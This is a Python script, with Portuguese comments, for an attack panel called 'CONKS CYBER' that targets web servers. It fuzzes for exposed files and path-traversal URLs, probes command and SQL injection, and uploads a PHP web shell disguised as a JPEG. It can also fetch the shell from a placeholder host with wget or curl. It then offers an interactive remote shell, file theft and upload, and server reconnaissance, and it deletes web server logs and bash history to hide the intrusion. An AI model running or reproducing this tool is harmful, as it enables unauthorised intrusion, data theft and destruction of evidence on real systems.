import requests
import threading
import time
import sys
import os
from urllib.parse import urljoin
from colorama import Fore, Style, init

# Inicializa cores
init(autoreset=True)

# ==========================================================
# CONFIGURAÇÕES E WORDLISTS DO MOTOR DE ATAQUE
# ==========================================================
BACKDOOR_PAYLOAD = "<?php system($_GET['cmd']); ?>"
BACKDOOR_NAME = "shell.php"
TIMEOUT = 5
MAX_THREADS = 20

WORDLIST = [
    "upload.php", "uploads/shell.php", "admin", "backup", "config.php.bak",
    ".git/config", ".env", "phpinfo.php", "test.php", "shell.php", "cmd.php",
    "wp-content/plugins", "wp-login.php", "server-status", "uploads", "tmp",
    "logs", "index.php?page=../../../../etc/passwd", 
    "index.php?page=php://filter/convert.base64-encode/resource=index.php",
    "index.php?include=../../etc/passwd", "index.php?file=../../../../etc/passwd",
    "index.php?page=php://input", "adminer.php", "phpmyadmin", "cgi-bin/",
    "api/", "api/v1/users", "api/upload", "backup.zip", "database.sql"
]

CMD_PAYLOADS = ["cmd", "command", "exec", "system", "shell", "run", "do", "ping", "nslookup", "host", "id", "whoami", "wget", "curl"]
SQL_PAYLOADS = ["'", "\"", "1' OR '1'='1", "1 OR 1=1", "1; DROP TABLE users--", "1' UNION SELECT 1,2,3--"]

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'X-Forwarded-For': '127.0.0.1',
    'X-Real-IP': '127.0.0.1',
    'Client-IP': '127.0.0.1',
    'Accept': '*/*'
}

# ==========================================================
# VARIÁVEIS GLOBAIS E ESTADO DO PAINEL
# ==========================================================
# Variáveis que armazenam o alvo atual e o caminho do backdoor encontrado
TARGET = ""
SHELL_PATH = ""
encontrado_global = False
lock = threading.Lock()

# ==========================================================
# FUNÇÕES AUXILIARES DE LOG E REQUISIÇÃO
# ==========================================================
def log_ok(msg): print(f"{Fore.GREEN}[+] {msg}")
def log_info(msg): print(f"{Fore.CYAN}[*] {msg}")
def log_warn(msg): print(f"{Fore.YELLOW}[!] {msg}")
def log_err(msg): print(f"{Fore.RED}[-] {msg}")

def request_get(url):
    try:
        return requests.get(url, headers=HEADERS, timeout=TIMEOUT, allow_redirects=True)
    except:
        return None

def request_post(url, data=None, files=None):
    try:
        return requests.post(url, headers=HEADERS, timeout=TIMEOUT, data=data, files=files, allow_redirects=True)
    except:
        return None

# ==========================================================
# MOTOR DE ATAQUE (CYBER INVASION)
# ==========================================================
def verificar_backdoor(shell_url):
    global encontrado_global, SHELL_PATH
    with lock:
        if encontrado_global:
            return
        test_url = f"{shell_url}?cmd=echo BACKDOOR_OK"
        r = request_get(test_url)
        if r and "BACKDOOR_OK" in r.text:
            log_ok(f"SUCESSO! BACKDOOR INSTALADO E EXECUTANDO em: {shell_url}")
            SHELL_PATH = shell_url
            encontrado_global = True

def fase_1_fuzzing_arquivos(target):
    log_info(f"Fase 1: Fuzzing de arquivos em {target} ({len(WORDLIST)} payloads)...")
    for path in WORDLIST:
        if encontrado_global: return
        url = urljoin(target, path)
        r = request_get(url)
        if r:
            if r.status_code == 200 and ("PHP" in r.text or "html" in r.text.lower() or len(r.text) > 10):
                log_ok(f"Encontrado: {url} (Status: {r.status_code})")
                if "upload" in path.lower() or "file" in path.lower() or "api" in path.lower():
                    fase_2_tentativa_upload(url, target)
            elif r.status_code == 403:
                log_warn(f"Existe, mas bloqueado (403): {url}")

def fase_2_tentativa_upload(upload_url, target):
    log_info(f"Tentando upload de backdoor em {upload_url}...")
    campos = ["file", "upload", "arquivo", "userfile", "image", "img", "foto", "anexo"]
    for field in campos:
        if encontrado_global: return
        files = {field: (BACKDOOR_NAME, BACKDOOR_PAYLOAD, 'image/jpeg')}
        r = request_post(upload_url, data={}, files=files)
        if r:
            if r.status_code == 200:
                log_info(f"Upload aceito no campo: {field}!")
                for shell_path in [f"uploads/{BACKDOOR_NAME}", BACKDOOR_NAME, f"tmp/{BACKDOOR_NAME}"]:
                    verificar_backdoor(urljoin(target, shell_path))
            elif r.status_code in [500, 501, 502]:
                log_err(f"Upload bloqueado no campo {field} (Erro {r.status_code})")

def fase_3_injecao_comandos(target):
    log_info(f"Fase 2: Testando Injeção de Comandos...")
    for path in ["index.php", "home.php", "admin.php", "test.php", "api/status"]:
        if encontrado_global: return
        url = urljoin(target, path)
        for param in CMD_PAYLOADS:
            test_url = f"{url}?{param}=id"
            r = request_get(test_url)
            if r and ("uid=" in r.text or "root" in r.text or "www-data" in r.text):
                log_ok(f"INJEÇÃO DE COMANDO ENCONTRADA! URL: {test_url}")
                fase_5_instalar_backdoor_por_comando(f"{url}?{param}=")

def fase_4_sql_injection(target):
    log_info(f"Fase 3: Testando SQL Injection básica...")
    for path in ["index.php?id=1", "produto.php?id=1", "api/item?id=1"]:
        if encontrado_global: return
        url = urljoin(target, path)
        for payload in SQL_PAYLOADS:
            test_url = url + payload
            r = request_get(test_url)
            if r and ("SQL syntax" in r.text or "Warning" in r.text):
                log_ok(f"POSSÍVEL SQL INJECTION em: {test_url}")

def fase_5_instalar_backdoor_por_comando(base_url):
    log_info(f"Tentando instalar backdoor via comando...")
    commands = [
        f"echo {BACKDOOR_PAYLOAD} > {BACKDOOR_NAME}",
        f"wget http://SEU_IP/{BACKDOOR_NAME} -O {BACKDOOR_NAME}",
        f"curl -o {BACKDOOR_NAME} http://SEU_IP/{BACKDOOR_NAME}"
    ]
    for cmd in commands:
        if encontrado_global: return
        encoded_cmd = cmd.replace(" ", "%20").replace(">", "%3E").replace("<", "%3C").replace("'", "%27")
        r = request_get(base_url + encoded_cmd)
        if r and r.status_code == 200:
            verificar_backdoor(urljoin(base_url, BACKDOOR_NAME))

def iniciar_ataque_automatico(target):
    global encontrado_global
    encontrado_global = False
    log_info(f"Iniciando ataque coordenado contra: {target}")
    while not encontrado_global:
        fase_1_fuzzing_arquivos(target)
        fase_3_injecao_comandos(target)
        fase_4_sql_injection(target)
        if not encontrado_global:
            log_warn("Nenhuma vulnerabilidade óbvia. Tentando novamente em 15s...")
            time.sleep(15)
    return True

# ==========================================================
# FUNÇÕES DO PAINEL (MODO INTERATIVO)
# ==========================================================
def menu_instalar_backdoor():
    global TARGET
    if not TARGET:
        log_err("Configure um alvo primeiro!")
        return
    log_info("Instalando Backdoor...")
    if iniciar_ataque_automatico(TARGET):
        log_ok(f"Backdoor instalado em: {SHELL_PATH}")

def menu_terminal_interativo():
    global SHELL_PATH
    if not SHELL_PATH:
        log_err("Nenhum backdoor instalado! Rode a opção 1 primeiro.")
        return
    
    print(Fore.CYAN + "\n[*] Terminal interativo aberto. Digite um comando ou 'exit' para sair.")
    while True:
        cmd = input(Fore.WHITE + "shell> ").strip()
        if cmd.lower() == "exit":
            break
        if not cmd:
            continue
        # Codifica o comando para a URL
        encoded_cmd = cmd.replace(" ", "%20").replace(">", "%3E").replace("<", "%3C").replace("'", "%27").replace("\"", "%22")
        test_url = f"{SHELL_PATH}?cmd={encoded_cmd}"
        r = request_get(test_url)
        if r:
            # Remove o rastro do PHP no output
            output = r.text.replace("BACKDOOR_OK", "").strip()
            if output:
                print(Fore.GREEN + output)
        else:
            log_err("Falha na comunicação com o backdoor.")

def menu_executar_comando():
    global SHELL_PATH
    if not SHELL_PATH:
        log_err("Nenhum backdoor instalado!")
        return
    cmd = input(Fore.CYAN + "Digite o comando para executar: ").strip()
    if not cmd:
        return
    encoded_cmd = cmd.replace(" ", "%20").replace(">", "%3E").replace("<", "%3C").replace("'", "%27")
    test_url = f"{SHELL_PATH}?cmd={encoded_cmd}"
    r = request_get(test_url)
    if r:
        print(Fore.GREEN + r.text.replace("BACKDOOR_OK", "").strip())
    else:
        log_err("Falha na execução.")

def menu_baixar_arquivo():
    global SHELL_PATH
    if not SHELL_PATH:
        log_err("Nenhum backdoor instalado!")
        return
    remote_file = input(Fore.CYAN + "Caminho do arquivo remoto (ex: /etc/passwd): ").strip()
    if not remote_file:
        return
    # Usa um comando base64 para baixar arquivos binários com segurança
    encoded_cmd = f"cat {remote_file} | base64".replace(" ", "%20").replace("/", "%2F")
    test_url = f"{SHELL_PATH}?cmd={encoded_cmd}"
    r = request_get(test_url)
    if r and r.text:
        import base64
        try:
            content = base64.b64decode(r.text.strip())
            local_name = os.path.basename(remote_file)
            with open(local_name, 'wb') as f:
                f.write(content)
            log_ok(f"Arquivo baixado com sucesso como: {local_name}")
        except:
            log_err("Falha ao decodificar o arquivo.")
    else:
        log_err("Arquivo não encontrado ou sem permissão.")

def menu_enviar_arquivo():
    global SHELL_PATH
    if not SHELL_PATH:
        log_err("Nenhum backdoor instalado!")
        return
    local_file = input(Fore.CYAN + "Caminho do arquivo local para enviar: ").strip()
    if not os.path.exists(local_file):
        log_err("Arquivo local não existe!")
        return
    # Usa o comando base64 para escrever o arquivo no servidor
    import base64
    with open(local_file, 'rb') as f:
        content = base64.b64encode(f.read()).decode()
    remote_path = input(Fore.CYAN + "Caminho remoto para salvar (ex: /tmp/arquivo.txt): ").strip()
    encoded_cmd = f"echo {content} | base64 -d > {remote_path}".replace(" ", "%20").replace("/", "%2F").replace("|", "%7C").replace(">", "%3E")
    test_url = f"{SHELL_PATH}?cmd={encoded_cmd}"
    r = request_get(test_url)
    if r and r.status_code == 200:
        log_ok(f"Arquivo enviado com sucesso para {remote_path}!")
    else:
        log_err("Falha ao enviar o arquivo.")

def menu_info_servidor():
    global SHELL_PATH
    if not SHELL_PATH:
        log_err("Nenhum backdoor instalado!")
        return
    log_info("Coletando informações do servidor...")
    commands = ["uname -a", "id", "pwd", "ls -la", "cat /etc/os-release 2>/dev/null || ver"]
    for cmd in commands:
        encoded_cmd = cmd.replace(" ", "%20").replace("/", "%2F").replace(">", "%3E").replace("|", "%7C")
        test_url = f"{SHELL_PATH}?cmd={encoded_cmd}"
        r = request_get(test_url)
        if r:
            print(Fore.CYAN + f"$ {cmd}")
            print(Fore.GREEN + r.text.replace("BACKDOOR_OK", "").strip() + "\n")

def menu_limpar_rastros():
    global SHELL_PATH
    if not SHELL_PATH:
        log_err("Nenhum backdoor instalado!")
        return
    log_info("Limpando logs...")
    commands = [
        "rm -rf /var/log/apache2/access.log /var/log/apache2/error.log /var/log/nginx/access.log /var/log/nginx/error.log 2>/dev/null",
        "history -c 2>/dev/null",
        "rm -rf ~/.bash_history 2>/dev/null"
    ]
    for cmd in commands:
        encoded_cmd = cmd.replace(" ", "%20").replace("/", "%2F").replace(">", "%3E").replace("|", "%7C").replace("~", "%7E")
        test_url = f"{SHELL_PATH}?cmd={encoded_cmd}"
        request_get(test_url)
    log_ok("Rastros de logs apagados com sucesso (se permissões permitirem).")

# ==========================================================
# MENU PRINCIPAL DO PAINEL
# ==========================================================
def exibir_menu():
    print(Fore.MAGENTA + Style.BRIGHT + """
    ===================================================
        CONKS CYBER - PAINEL DE CONTROLE COMPLETO
    ===================================================
    """)
    if TARGET:
        print(Fore.YELLOW + f"Alvo configurado: {TARGET}")
    if SHELL_PATH:
        print(Fore.GREEN + f"Backdoor ativo em: {SHELL_PATH}")
    print(Fore.CYAN + """
    [1] Instalar Backdoor
    [2] Terminal Interativo
    [3] Executar Comando
    [4] Baixar Arquivo
    [5] Enviar Arquivo
    [6] Info do Servidor
    [7] Limpar Rastros
    [8] Configurar Alvo
    [9] Sair
    """)

def main():
    global TARGET
    while True:
        exibir_menu()
        opcao = input(Fore.CYAN + "Escolha uma opção: ").strip()

        if opcao == "1":
            menu_instalar_backdoor()
        elif opcao == "2":
            menu_terminal_interativo()
        elif opcao == "3":
            menu_executar_comando()
        elif opcao == "4":
            menu_baixar_arquivo()
        elif opcao == "5":
            menu_enviar_arquivo()
        elif opcao == "6":
            menu_info_servidor()
        elif opcao == "7":
            menu_limpar_rastros()
        elif opcao == "8":
            TARGET = input(Fore.CYAN + "Digite a URL do alvo (ex: http://seusite.com): ").strip()
            log_ok(f"Alvo configurado: {TARGET}")
        elif opcao == "9":
            print(Fore.RED + "Encerrando painel...")
            sys.exit(0)
        else:
            log_err("Opção inválida.")

if __name__ == "__main__":
    main()